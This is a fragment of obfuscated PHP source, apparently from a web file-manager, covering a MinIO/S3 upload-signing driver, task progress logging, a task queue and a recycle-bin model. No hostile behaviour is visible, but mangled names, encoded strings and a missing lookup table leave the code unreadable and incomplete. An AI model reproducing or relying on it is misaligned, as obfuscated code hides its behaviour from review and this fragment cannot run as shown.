$çŸî˜ÊÄ[$øÏ‡©è†[220]][0][$øÏ‡©è†[32]]; return stripos($‚­Ò‰à, $­­÷’„  . $øÏ‡©è†[8]) === 0 ? !0 : !1; if (substr($‚­Ò‰à, -1) == $øÏ‡©è†[8]) { return !0; } if (get_path_this($‚­Ò‰à) == get_path_this($­­÷’„ )) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($æ›Ğ¬©”) { parent::__construct($æ›Ğ¬©”); $this->signatureVersion($_SERVER[íû‘ş´][231]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($ÔÓ’êôÄ, $ş’™ù÷è = 3600) { $‘ù½¯È™ =& $_SERVER[íû‘ş´]; $Åü¿Íï = $‘ù½¯È™[213]; $×ËêöÊÖ = $‘ù½¯È™[253]; $×‡ìûÓ¢ = $‘ù½¯È™[62]; $ìÙ—ğ = gmdate($‘ù½¯È™[254]); $Ôí¨…Ğ = gmdate($‘ù½¯È™[255]); $ê…Ó¡‹Ô = $‘ù½¯È™[256]; $Íûòàõç = $ş’™ù÷è . $‘ù½¯È™[12]; $ĞÁñ‚ = $‘ù½¯È™[257]; $ãªÌÀ‚Ø = array($this->accessKey, $Ôí¨…Ğ, $this->region, $×‡ìûÓ¢, $ê…Ó¡‹Ô); $£¨“‘ÖÏ = implode($‘ù½¯È™[8], $ãªÌÀ‚Ø); $ï«†ª±¬ = array($‘ù½¯È™[258] => gmdate($‘ù½¯È™[259], strtotime($‘ù½¯È™[260])), $‘ù½¯È™[261] => array(array($‘ù½¯È™[262] => $this->bucket), array($‘ù½¯È™[263] => $Åü¿Íï), array($‘ù½¯È™[264], $‘ù½¯È™[265], $‘ù½¯È™[12]), array($‘ù½¯È™[264], $‘ù½¯È™[266], $‘ù½¯È™[12]), array($‘ù½¯È™[264], $‘ù½¯È™[267], $‘ù½¯È™[12]), array($‘ù½¯È™[268] => $ĞÁñ‚), array($‘ù½¯È™[269] => $£¨“‘ÖÏ), array($‘ù½¯È™[270] => $×ËêöÊÖ), array($‘ù½¯È™[271] => $ìÙ—ğ), array($‘ù½¯È™[272] => $Íûòàõç))); $áÙ°Êğà = base64_encode(json_encode($ï«†ª±¬)); $ŠôûÚ¸ = hash_hmac($‘ù½¯È™[273], $Ôí¨…Ğ, $‘ù½¯È™[274] . $this->secret, !0); $¨Ô‡‘ä¯ = hash_hmac($‘ù½¯È™[273], $this->region, $ŠôûÚ¸, !0); $éÁûŸ = hash_hmac($‘ù½¯È™[273], $×‡ìûÓ¢, $¨Ô‡‘ä¯, !0); $êØ›âÇÉ = hash_hmac($‘ù½¯È™[273], $ê…Ó¡‹Ô, $éÁûŸ, !0); $€¶ÜöÂ = hash_hmac($‘ù½¯È™[273], $áÙ°Êğà, $êØ›âÇÉ); $Š°å¯Š• = array($‘ù½¯È™[230] => $‘ù½¯È™[12], $‘ù½¯È™[275] => $‘ù½¯È™[12], $‘ù½¯È™[263] => $Åü¿Íï, $‘ù½¯È™[268] => $ĞÁñ‚, $‘ù½¯È™[276] => $áÙ°Êğà, $‘ù½¯È™[277] => $£¨“‘ÖÏ, $‘ù½¯È™[278] => $×ËêöÊÖ, $‘ù½¯È™[279] => $ìÙ—ğ, $‘ù½¯È™[280] => $Íûòàõç, $‘ù½¯È™[281] => $€¶ÜöÂ, $‘ù½¯È™[196] => $this->getHost()); return $Š°å¯Š•; } } goto e­Ø¼¸‰Î¡; A¹Ğ„Ğ´ùƒ: class TaskHttp extends Task { protected function startAfter() { $ŠªÍîÖ® =& $_SERVER[íû‘ş´]; $¢Ç±¸â¤ =& $this->task; $¢Ç±¸â¤[$ŠªÍîÖ®[1782]] = 1; Hook::bind($ŠªÍîÖ®[1750], array($this, $ŠªÍîÖ®[1783])); Hook::bind($ŠªÍîÖ®[1752], array($this, $ŠªÍîÖ®[1784])); Hook::bind($ŠªÍîÖ®[1754], array($this, $ŠªÍîÖ®[1785])); } protected function endAfter() { $Ò‰Ñ´Õš =& $_SERVER[íû‘ş´]; Hook::unbind($Ò‰Ñ´Õš[1750], array($this, $Ò‰Ñ´Õš[1783])); Hook::unbind($Ò‰Ñ´Õš[1752], array($this, $Ò‰Ñ´Õš[1784])); Hook::unbind($Ò‰Ñ´Õš[1754], array($this, $Ò‰Ñ´Õš[1785])); } public function progressStart($ûƒ¶Üö®) { $õŒ•ÕÕ =& $_SERVER[íû‘ş´]; $±£ü»ä = curl_getinfo($ûƒ¶Üö®); self::log($õŒ•ÕÕ[1786] . $±£ü»ä[$õŒ•ÕÕ[351]]); self::valueSet($this->task[$õŒ•ÕÕ[443]], $this->task); } public function progressEnd($í¾«’ÒÉ) { $î¦µùµÄ =& $_SERVER[íû‘ş´]; self::log($î¦µùµÄ[1787] . $this->task[$î¦µùµÄ[443]]); $this->end(); } public function progress($ï£…Û„, $Â¨¬Ûß, $Ø‚‹€ãü, $¶™‡³¶, $˜¾ıŞˆ) { $ù£ûÂõ¾ =& $_SERVER[íû‘ş´]; $…Ï§“øÕ =& $this->task; if ($˜¾ıŞˆ > 0) { $…Ï§“øÕ[$ù£ûÂõ¾[845]] = $…Ï§“øÕ[$ù£ûÂõ¾[845]] == 0 ? $¶™‡³¶ : $…Ï§“øÕ[$ù£ûÂõ¾[845]]; $…Ï§“øÕ[$ù£ûÂõ¾[1706]] = $˜¾ıŞˆ; } else { if ($Ø‚‹€ãü > 0) { $…Ï§“øÕ[$ù£ûÂõ¾[845]] = $…Ï§“øÕ[$ù£ûÂõ¾[845]] == 0 ? $Â¨¬Ûß : $…Ï§“øÕ[$ù£ûÂõ¾[845]]; $…Ï§“øÕ[$ù£ûÂõ¾[1706]] = $Ø‚‹€ãü; } } $this->update(); self::log("\160\x72\x6f\x67\162\145\163\163\110\164\164\x70\72\x64\x6f\167\x6e\72{$Ø‚‹€ãü}\x2f{$Â¨¬Ûß}\73\x20\165\x70\154\x6f\x61\x64\72{$˜¾ıŞˆ}\x2f{$¶™‡³¶}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($¾âˆ€Ùæ, $Áà¿ä¼ = '', $¯ÉÎá¿ë = 0, $¢Øîø‘İ = '') { $åıÛ…¿Å =& $_SERVER[íû‘ş´]; $æäË·†ı = new Task($¾âˆ€Ùæ, $Áà¿ä¼, $¯ÉÎá¿ë, $¢Øîø‘İ); $GLOBALS[$åıÛ…¿Å[1788] . $¾âˆ€Ùæ] = new TaskLog($åıÛ…¿Å[1689], $æäË·†ı, $¢Øîø‘İ); return $æäË·†ı; } public function __construct($„Úã×° = '', $ĞĞÎÓËê = '', $ÏÌ‘ª¹İ = '') { $ûÊ—¥‹ =& $_SERVER[íû‘ş´]; if (!$„Úã×°) { $„Úã×° = $ûÊ—¥‹[1689]; } $•ÀÒœ«ı = $„Úã×° . $ûÊ—¥‹[430] . rand_string(10); if (!$ÏÌ‘ª¹İ) { $ÏÌ‘ª¹İ = $„Úã×° . $ûÊ—¥‹[53] . $ÏÌ‘ª¹İ; } switch ($„Úã×°) { case $ûÊ—¥‹[1689]: if (!$ĞĞÎÓËê || !$ĞĞÎÓËê->task) { return echoLog($„Úã×° . $ûÊ—¥‹[1789]); } $¿™ñÉº = $ĞĞÎÓËê; $•ÀÒœ«ı = $¿™ñÉº->task[$ûÊ—¥‹[443]]; $„Úã×° = $¿™ñÉº->task[$ûÊ—¥‹[443]]; if (!$¿™ñÉº->task[$ûÊ—¥‹[1599]]) { $¿™ñÉº->task[$ûÊ—¥‹[1599]] = $ÏÌ‘ª¹İ ? $ÏÌ‘ª¹İ : $„Úã×°; } break; case $ûÊ—¥‹[1790]: if (!$ĞĞÎÓËê) { return echoLog($„Úã×° . $ûÊ—¥‹[1791]); } $ÖíøşÉ = is_string($ĞĞÎÓËê) ? array($ĞĞÎÓËê) : $ĞĞÎÓËê; $¿™ñÉº = new TaskFileTransfer($•ÀÒœ«ı, $„Úã×°, 0, $ÏÌ‘ª¹İ ? $ÏÌ‘ª¹İ : $ÖíøşÉ[0]); foreach ($ÖíøşÉ as $†‡µØ´) { $¿™ñÉº->addPath($†‡µØ´); } break; case $ûÊ—¥‹[357]: if (!$ĞĞÎÓËê) { return echoLog($„Úã×° . $ûÊ—¥‹[1791]); } $ÖíøşÉ = is_string($ĞĞÎÓËê) ? array($ĞĞÎÓËê) : $ĞĞÎÓËê; $¿™ñÉº = new TaskZip($•ÀÒœ«ı, $„Úã×°, 0, $ÏÌ‘ª¹İ ? $ÏÌ‘ª¹İ : $ÖíøşÉ[0]); foreach ($ÖíøşÉ as $†‡µØ´) { $¿™ñÉº->addPath($†‡µØ´); } break; case $ûÊ—¥‹[1272]: if (!$ĞĞÎÓËê) { return echoLog($„Úã×° . $ûÊ—¥‹[1791]); } $¿™ñÉº = new TaskUnZip($•ÀÒœ«ı, $„Úã×°, 0, $ÏÌ‘ª¹İ ? $ÏÌ‘ª¹İ : $ĞĞÎÓËê); if ($ĞĞÎÓËê) { $¿™ñÉº->addFile($ĞĞÎÓËê); } break; case $ûÊ—¥‹[149]: $¿™ñÉº = new TaskHttp($•ÀÒœ«ı, $„Úã×°); break; default: return; break; } $this->task = $¿™ñÉº; $this->taskID = $•ÀÒœ«ı; Hook::bind($ûÊ—¥‹[1726], array($this, $ûÊ—¥‹[1792])); Hook::bind($ûÊ—¥‹[1728], array($this, $ûÊ—¥‹[1793])); Hook::bind($ûÊ—¥‹[1722], array($this, $ûÊ—¥‹[1794])); echoLog($ûÊ—¥‹[1795] . $¿™ñÉº->task[$ûÊ—¥‹[1599]]); } public function __destruct() { $this->end(); } public function end($ôõ¹÷¢ = '') { $ã±‘±ğ‚ =& $_SERVER[íû‘ş´]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ôõ¹÷¢); $this->task = !1; $this->taskID = !1; Hook::unbind($ã±‘±ğ‚[1726], array($this, $ã±‘±ğ‚[1792])); Hook::unbind($ã±‘±ğ‚[1728], array($this, $ã±‘±ğ‚[1793])); Hook::unbind($ã±‘±ğ‚[1722], array($this, $ã±‘±ğ‚[1794])); } public function taskUpdate($ï¼€Ëş„) { $ä·Å¿” =& $_SERVER[íû‘ş´]; if (!$ï¼€Ëş„ || $this->taskID != $ï¼€Ëş„[$ä·Å¿”[443]]) { return; } $–Æ¦Ò÷å = 20; $«†¶÷°ê = intval($ï¼€Ëş„[$ä·Å¿”[1707]] * $–Æ¦Ò÷å); $‘¦…¶š = $ä·Å¿”[163] . str_repeat($ä·Å¿”[942], $«†¶÷°ê) . $ä·Å¿”[1072] . str_repeat($ä·Å¿”[53], $–Æ¦Ò÷å - $«†¶÷°ê) . $ä·Å¿”[165]; $²ÈŠçÅÆ = $‘¦…¶š . sprintf($ä·Å¿”[1796], $ï¼€Ëş„[$ä·Å¿”[1707]] * 100) . $ä·Å¿”[1797]; $Ù¡ûáˆİ = $²ÈŠçÅÆ . $ï¼€Ëş„[$ä·Å¿”[1706]] . $ä·Å¿”[8] . $ï¼€Ëş„[$ä·Å¿”[845]] . LNG($ä·Å¿”[1798]); $ÛŠì‰€Œ = $ä·Å¿”[12]; if ($ï¼€Ëş„[$ä·Å¿”[1782]]) { $Ù¡ûáˆİ = $²ÈŠçÅÆ . size_format($ï¼€Ëş„[$ä·Å¿”[1706]]) . $ä·Å¿”[8] . size_format($ï¼€Ëş„[$ä·Å¿”[845]]); $ÛŠì‰€Œ = size_format($ï¼€Ëş„[$ä·Å¿”[1708]]) . $ä·Å¿”[1799]; } if ($ï¼€Ëş„[$ä·Å¿”[1122]]) { $ï¼€Ëş„[$ä·Å¿”[1756]] = $ï¼€Ëş„[$ä·Å¿”[1122]] . $ä·Å¿”[53] . $ï¼€Ëş„[$ä·Å¿”[1756]]; } if ($ï¼€Ëş„[$ä·Å¿”[1756]]) { $ƒ„ŒçÃ = $ä·Å¿”[12]; if ($ï¼€Ëş„[$ä·Å¿”[1758]]) { $ƒ„ŒçÃ = $ä·Å¿”[50] . size_format($ï¼€Ëş„[$ä·Å¿”[1759]]) . $ä·Å¿”[8] . size_format($ï¼€Ëş„[$ä·Å¿”[1758]]); } $ÛŠì‰€Œ .= $ï¼€Ëş„[$ä·Å¿”[1756]] . $ƒ„ŒçÃ; } if ($ï¼€Ëş„[$ä·Å¿”[822]] && !$ï¼€Ëş„[$ä·Å¿”[1758]]) { $ÛŠì‰€Œ .= $ä·Å¿”[53] . size_format($ï¼€Ëş„[$ä·Å¿”[1763]]) . $ä·Å¿”[8] . size_format($ï¼€Ëş„[$ä·Å¿”[822]]); } echoLog($Ù¡ûáˆİ . $ä·Å¿”[53] . $ÛŠì‰€Œ, !0); } public function taskEnd($õ“îŞƒ) { $ˆó„€èÎ =& $_SERVER[íû‘ş´]; if (!$õ“îŞƒ || $this->taskID != $õ“îŞƒ[$ˆó„€èÎ[443]]) { return; } $²×ëì‡º = $õ“îŞƒ ? $õ“îŞƒ[$ˆó„€èÎ[1706]] . $ˆó„€èÎ[8] . $õ“îŞƒ[$ˆó„€èÎ[845]] . LNG($ˆó„€èÎ[1798]) . $ˆó„€èÎ[71] : $ˆó„€èÎ[12]; echoLog($ˆó„€èÎ[1800] . $õ“îŞƒ[$ˆó„€èÎ[1599]] . ($õ“îŞƒ[$ˆó„€èÎ[503]] ? $ˆó„€èÎ[71] . $õ“îŞƒ[$ˆó„€èÎ[503]] : $ˆó„€èÎ[12]) . $ˆó„€èÎ[71] . $²×ëì‡º . $ˆó„€èÎ[1801] . sprintf($ˆó„€èÎ[910], timeFloat() - $õ“îŞƒ[$ˆó„€èÎ[1709]]) . $ˆó„€èÎ[1721]); $this->end(); } public function taskKill($À¸á©š™) { $İÒı»Ó˜ =& $_SERVER[íû‘ş´]; if (!$À¸á©š™ || $this->taskID != $À¸á©š™[$İÒı»Ó˜[443]]) { return; } echoLog($İÒı»Ó˜[1802] . $À¸á©š™[$İÒı»Ó˜[1599]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\x6b\x51\x75\x65\165\x65\114\145\156\x67\x74\x68"; const QUEUE_DATA = "\164\141\x73\153\121\x75\x65\x75\145\104\141\164\x61"; const QUEUE_TIME = "\164\141\x73\153\121\x75\x65\165\145\114\141\x73\x74\x52\165\x6e"; const QUEUE_THREAD = "\x74\141\163\x6b\121\x75\145\165\145\124\150\162\145\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ÀèÒ’š, $Ÿ»Éïäë = array(), $¡¸é´Ä = '', $êÙ·å¨è = '') { $ƒšæ—ˆû =& $_SERVER[íû‘ş´]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($êÙ·å¨è && array_find_by_field(self::$listData, $ƒšæ—ˆû[94], $êÙ·å¨è)) { return !0; } if ($êÙ·å¨è && array_find_by_field(self::$listDataAdd, $ƒšæ—ˆû[94], $êÙ·å¨è)) { return !0; } self::$listDataAdd[] = array($ƒšæ—ˆû[308] => $ÀèÒ’š, $ƒšæ—ˆû[1803] => $Ÿ»Éïäë, $ƒšæ—ˆû[503] => $¡¸é´Ä, $ƒšæ—ˆû[94] => $êÙ·å¨è); return !0; } public static function addSubmit() { $ê¡‡Üì· =& $_SERVER[íû‘ş´]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ê¡‡Üì·[1804] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ê¡‡Üì·[12], $ê¡‡Üì·[503])), $ê¡‡Üì·[185]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($Ë¾è”çÁ, $¯ş›ÚÛç = array(), $­·×ü™ë = '', $¿˜‘åüØ = '') { $Ş©İ¼Íí =& $_SERVER[íû‘ş´]; if (self::count() >= self::MAX_LENGTH) { return !1; } $¨Âü¹ş˜ = self::getAll(); if ($¿˜‘åüØ && array_find_by_field($¨Âü¹ş˜, $Ş©İ¼Íí[94], $¿˜‘åüØ)) { return !0; } $¨Âü¹ş˜[] = array($Ş©İ¼Íí[308] => $Ë¾è”çÁ, $Ş©İ¼Íí[1803] => $¯ş›ÚÛç, $Ş©İ¼Íí[503] => $­·×ü™ë, $Ş©İ¼Íí[94] => $¿˜‘åüØ); self::setAll($¨Âü¹ş˜); write_log($Ş©İ¼Íí[1804] . $­·×ü™ë, $Ş©İ¼Íí[185]); return !0; } public static function run() { $™ÀÙÀ¶ =& $_SERVER[íû‘ş´]; $˜¶Œ¥Ä = self::getAll(); $±À´Éö = array_shift($˜¶Œ¥Ä); if (!$±À´Éö) { return !1; } self::setAll($˜¶Œ¥Ä); $‰†Š®Ûš = timeFloat(); $œ¢© šÏ = $™ÀÙÀ¶[12]; try { $œ¢© šÏ = Hook::apply($±À´Éö[$™ÀÙÀ¶[308]], $±À´Éö[$™ÀÙÀ¶[1803]]); } catch (Exception $ã¾®¦Ë») { write_log($ã¾®¦Ë», $™ÀÙÀ¶[1240]); } $½é¼Û…¤ = number_format(timeFloat() - $‰†Š®Ûš, 3) . $™ÀÙÀ¶[1721]; if ($œ¢© šÏ && is_string($œ¢© šÏ)) { $½é¼Û…¤ = $½é¼Û…¤ . $™ÀÙÀ¶[1805] . $œ¢© šÏ; } write_log($™ÀÙÀ¶[1806] . $±À´Éö[$™ÀÙÀ¶[503]] . $™ÀÙÀ¶[1807] . $½é¼Û…¤, $™ÀÙÀ¶[185]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $£äİÃÖæ =& $_SERVER[íû‘ş´]; $Ô×ºı = self::threadCount() + 1; if ($Ô×ºı > 3 || !self::count()) { return; } write_log($£äİÃÖæ[1808] . $Ô×ºı, $£äİÃÖæ[185]); Cache::set(self::QUEUE_THREAD, $Ô×ºı, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($£äİÃÖæ[1809], $£äİÃÖæ[185]); } public static function getKey($ß…ô™ÕŠ, $ƒˆÙûºÈ = "\x69\156\x74") { $ÀÉ¾‚´ =& $_SERVER[íû‘ş´]; Cache::removeMemory($ß…ô™ÕŠ); $¢ÀûÏş = Cache::get($ß…ô™ÕŠ); if ($ƒˆÙûºÈ == $ÀÉ¾‚´[332]) { return $¢ÀûÏş ? intval($¢ÀûÏş) : 0; } if ($ƒˆÙûºÈ == $ÀÉ¾‚´[1810]) { return is_array($¢ÀûÏş) ? $¢ÀûÏş : array(); } return $¢ÀûÏş; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[íû‘ş´][1810]); } public static function setAll($ÈÂÌø“Ê) { $±Ê­¦²¶ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ÈÂÌø“Ê), $±Ê­¦²¶); Cache::set(self::QUEUE_DATA, $ÈÂÌø“Ê, $±Ê­¦²¶); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto däÃ˜¸¡è; cã‚ÒšŠñÓ: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\x72\x63\x65\137\162\x65\x63\171\x63\x6c\x65"; protected $dataAuto = array(array("\x63\162\145\141\164\145\x54\151\155\145", "\x74\151\155\145", "\x69\x6e\163\145\x72\x74", "\x66\x75\156\143\164\151\157\x6e")); public function listData($˜‘ÔÔıÖ = false) { $Ş´£ŸÌµ =& $_SERVER[íû‘ş´]; $˜‘ÔÔıÖ = $˜‘ÔÔıÖ ? $˜‘ÔÔıÖ : USER_ID; $ßèÜ¾  = $this->where(array($Ş´£ŸÌµ[1696] => $˜‘ÔÔıÖ))->select(); return array_to_keyvalue($ßèÜ¾ , $Ş´£ŸÌµ[12], $Ş´£ŸÌµ[181]); } public function moveToRecycle($±Íâ§Ğ) { $¡ãËŠîş =& $_SERVER[íû‘ş´]; $ŸÅ•¦Ò = Model($¡ãËŠîş[1390]); $‘™ÀÍ = $ŸÅ•¦Ò->sourceInfo($±Íâ§Ğ); if (!$‘™ÀÍ || $‘™ÀÍ[$¡ãËŠîş[482]] == $¡ãËŠîş[88]) { return; } $íÇÙĞ°â = array($¡ãËŠîş[468] => $±Íâ§Ğ, $¡ãËŠîş[1696] => USER_ID, $¡ãËŠîş[626] => $‘™ÀÍ[$¡ãËŠîş[178]], $¡ãËŠîş[627] => $‘™ÀÍ[$¡ãËŠîş[548]], $¡ãËŠîş[630] => $‘™ÀÍ[$¡ãËŠîş[563]]); $this->add($íÇÙĞ°â); $this->recycleMove($±Íâ§Ğ, 1); if ($‘™ÀÍ[$¡ãËŠîş[462]] == $¡ãËŠîş[88]) { $ íî À = array($¡ãËŠîş[630] => array($¡ãËŠîş[590], $‘™ÀÍ[$¡ãËŠîş[563]] . $±Íâ§Ğ . $¡ãËŠîş[591])); $ŸÅ•¦Ò->where($ íî À)->setField($¡ãËŠîş[482], 1); } } public function clear() { $this->remove(!1); } public function remove($ˆå•Í™ã = false, $»ç—¸© = false) { $ùÄøÄ‡÷ =& $_SERVER[íû‘ş´]; $»ç—¸© = $»ç—¸© ? $»ç—¸© : USER_ID; $œË€…¯– = Model($ùÄøÄ‡÷[1390]); $ùÑÌ™—Ú = $this->listData($»ç—¸©); $ˆå•Í™ã = $ˆå•Í™ã === !1 ? !1 : $ˆå•Í™ã; $À±‹’àğ = array(); foreach ($ùÑÌ™—Ú as $üÓù½) { if ($ˆå•Í™ã != !1 && !in_array($üÓù½, $ˆå•Í™ã)) { continue; } $·Í÷®…å = $œË€…¯–->sourceInfo($üÓù½); $œË€…¯–->remove($üÓù½, !1); $Š–óÒ¯ = $·Í÷®…å[$ùÄøÄ‡÷[178]] . $ùÄøÄ‡÷[11] . $·Í÷®…å[$ùÄøÄ‡÷[548]]; $À±‹’àğ[$Š–óÒ¯] = array($ùÄøÄ‡÷[626] => $·Í÷®…å[$ùÄøÄ‡÷[178]], $ùÄøÄ‡÷[548] => $·Í÷®…å[$ùÄøÄ‡÷[548]]); $this->where(array($ùÄøÄ‡÷[181] => $üÓù½))->delete(); } foreach ($À±‹’àğ as $õ¤‹¸ç) { $œË€…¯–->targetSpaceUpdate($õ¤‹¸ç[$ùÄøÄ‡÷[178]], $õ¤‹¸ç[$ùÄøÄ‡÷[548]]); } } public function restore($ùì†Í²ı = false) { $À±Ì‚Š = $this->listData(); $this->_restoreSource($À±Ì‚Š, $ùì†Í²ı); } public function removeUserAll($ÖéÉ¦Ø¹) { $this->remove(!1, $ÖéÉ¦Ø¹); } public function restoreItem($¥èş¢¥ü) { $this->_restoreSource(array($¥èş¢¥ü), array($¥èş¢¥ü)); } private function _restoreSource($ƒ½¬Ó˜, $ÔÑúÒİÇ) { $şöŠöÈ =& $_SERVER[íû‘ş´]; $¨ùÇ÷è = Model($şöŠöÈ[1390]); $ÔÑúÒİÇ = $ÔÑúÒİÇ == !1 ? !1 : $ÔÑúÒİÇ; if (!$ƒ½¬Ó˜) { return !0; } $óµÇÓüÕ = array(); foreach ($ƒ½¬Ó˜ as $Ã·ÍúÂ˜) { if ($ÔÑúÒİÇ != !1 && !in_array($Ã·ÍúÂ˜, $ÔÑúÒİÇ)) { continue; } $‘Ø†©…À = $¨ùÇ÷è->sourceInfo($Ã·ÍúÂ˜); $€Ü²³÷Ë = $¨ùÇ÷è->sourceInfo($‘Ø†©…À[$şöŠöÈ[180]]); if ($€Ü²³÷Ë[$şöŠöÈ[482]] == $şöŠöÈ[88]) { continue; } $¨ùÇ÷è->lockMoveStart($Ã·ÍúÂ˜); $this->recycleMove($Ã·ÍúÂ˜, 0); if ($‘Ø†©…À[$şöŠöÈ[462]] == $şöŠöÈ[88]) { $Ğ¡ë’º… = array($şöŠöÈ[630] => array($şöŠöÈ[590], $‘Ø†©…À[$şöŠöÈ[563]] . $Ã·ÍúÂ˜ . $şöŠöÈ[591])); $¨ùÇ÷è->where($Ğ¡ë’º…)->setField($şöŠöÈ[482], 0); $this->restoreFolderChildren($Ã·ÍúÂ˜, $ƒ½¬Ó˜); } $this->where(array($şöŠöÈ[181] => $Ã·ÍúÂ˜))->delete(); $¨ùÇ÷è->folderSizeReset($‘Ø†©…À[$şöŠöÈ[180]]); $óµÇÓüÕ[] = $‘Ø†©…À[$şöŠöÈ[180]]; if ($‘Ø†©…À[$şöŠöÈ[462]] == $şöŠöÈ[88]) { $óµÇÓüÕ[] = $Ã·ÍúÂ˜; } $¨ùÇ÷è->lockMoveEnd($Ã·ÍúÂ˜); } $¨ùÇ÷è->updateModifyTime($óµÇÓüÕ); } private function restoreFolderChildren($Òßç¸ŞÃ, $¤ÑÊ‚Èƒ) { $Í­»Ñ®ß =& $_SERVER[íû‘ş´]; $¼´ø“¿ı = Model($Í­»Ñ®ß[1390]); $°›Ê›“ = array($Í­»Ñ®ß[181] => array($Í­»Ñ®ß[7], array())); foreach ($¤ÑÊ‚Èƒ as $™¨ôçå) { if ($™¨ôçå == $Òßç¸ŞÃ) { continue; } if (!$¼´ø“¿ı->isParentOf($Òßç¸ŞÃ, $™¨ôçå)) { continue; } $ÉôóÑ÷ = $¼´ø“¿ı->sourceInfo($™¨ôçå); if ($ÉôóÑ÷[$Í­»Ñ®ß[462]] == $Í­»Ñ®ß[88]) { $°›Ê›“[] = array($Í­»Ñ®ß[630] => array($Í­»Ñ®ß[590], $ÉôóÑ÷[$Í­»Ñ®ß[563]] . $™¨ôçå . $Í­»Ñ®ß[591])); } else { $°›Ê›“[$Í­»Ñ®ß[181]][1][] = $™¨ôçå; } } if (!$°›Ê›“[$Í­»Ñ®ß[181]][1]) { unset($°›Ê›“[$Í­»Ñ®ß[181]]); } if (!$°›Ê›“) { return; } if (is_array($°›Ê›“[$Í­»Ñ®ß[181]]) && is_array($°›Ê›“[$Í­»Ñ®ß[181]][1])) { $°›Ê›“[$Í­»Ñ®ß[181]][1] = array_unique($°›Ê›“[$Í­»Ñ®ß[181]][1]); } $°›Ê›“[$Í­»Ñ®ß[1058]] = $Í­»Ñ®ß[2001]; $¼´ø“¿ı->where($°›Ê›“)->setField($Í­»Ñ®ß[482], 1); } private function recycleMove($™ÌÂ”â×, $„¼ï–§„ = 1) { $‰†ºö =& $_SERVER[íû‘ş´]; $“Å°ûİĞ = Model($‰†ºö[1390]); $‰ï™  = Model($‰†ºö[2220]); $Õáùú§³ = array($‰†ºö[181] => $™ÌÂ”â×); if ($„¼ï–§„) { $“Å°ûİĞ->where($Õáùú§³)->setField($‰†ºö[482], 1); $‰ï™ ->eventRecycle($™ÌÂ”â×, $‰†ºö[2221]); } else { $Š¹È¼Ãª = $“Å°ûİĞ->where($Õáùú§³)->find(); $Ä‡‰™ = $Š¹È¼Ãª[$‰†ºö[462]] == $‰†ºö[88]; $¤‚×ÚæÁ = $“Å°ûİĞ->fileNameAuto($Š¹È¼Ãª[$‰†ºö[180]], $Š¹È¼Ãª[$‰†ºö[32]], REPEAT_RENAME_FOLDER, $Ä‡‰™); if ($¤‚×ÚæÁ != $Š¹È¼Ãª[$‰†ºö[32]]) { $“Å°ûİĞ->rename($™ÌÂ”â×, $¤‚×ÚæÁ); } $“Å°ûİĞ->where($Õáùú§³)->setField($‰†ºö[482], 0); $‰ï™ ->eventRecycle($™ÌÂ”â×, $‰†ºö[2222]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\163\x6f\165\162\143\145\123\x65\143\x72\145\x74\x4c\x69\163\x74"; public $field = array("\163\157\165\x72\143\x65\x49\104", "\164\171\x70\145\x49\104", "\143\x72\x65\141\x74\145\125\x73\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\x2e\x73\164\157\x72\141\x67\x65\x4c\x69\163\164"; public $field = array("\x6e\x61\155\x65", "\x73\151\172\145\x4d\x61\x78", "\x73\x79\163\164\x65\155", "\x64\x65\x66\141\165\x6c\164", "\144\162\x69\x76\145\162", "\143\x6f\156\x66\151\x67"); public function listData($İŒÖ¹Ÿ» = false, $äÓû¼úµ = "\155\x6f\144\x69\x66\171\x54\151\x6d\145", $ÁÁŸÕÆç = false) { $ıÏÏ§• =& $_SERVER[íû‘ş´]; $®ÎÂòÍ = parent::listData($İŒÖ¹Ÿ», $äÓû¼úµ, $ÁÁŸÕÆç); if ($İŒÖ¹Ÿ») { return $®ÎÂòÍ; } $‰¸¯†ïç = $this->ioSizeUseGet(array_to_keyvalue($®ÎÂòÍ, $ıÏÏ§•[12], $ıÏÏ§•[443])); foreach ($®ÎÂòÍ as $ØÃûü»Ñ => $é”Ñ‹Ğİ) { unset($®ÎÂòÍ[$ØÃûü»Ñ][$ıÏÏ§•[6]]); $®ÎÂòÍ[$ØÃûü»Ñ][$ıÏÏ§•[1892]] = isset($‰¸¯†ïç[$é”Ñ‹Ğİ[$ıÏÏ§•[443]]]) ? $‰¸¯†ïç[$é”Ñ‹Ğİ[$ıÏÏ§•[443]]] : 0; } return $®ÎÂòÍ; } public function ioSizeUseGet($§²Ó¥ğµ) { $ÕÊååéå =& $_SERVER[íû‘ş´]; if (!$§²Ó¥ğµ) { return array(); } $½õ·¤„ë = $ÕÊååéå[2223] . implode($ÕÊååéå[50], $§²Ó¥ğµ); $ÂÔÖêŞá = Cache::get($½õ·¤„ë); if ($ÂÔÖêŞá) { return 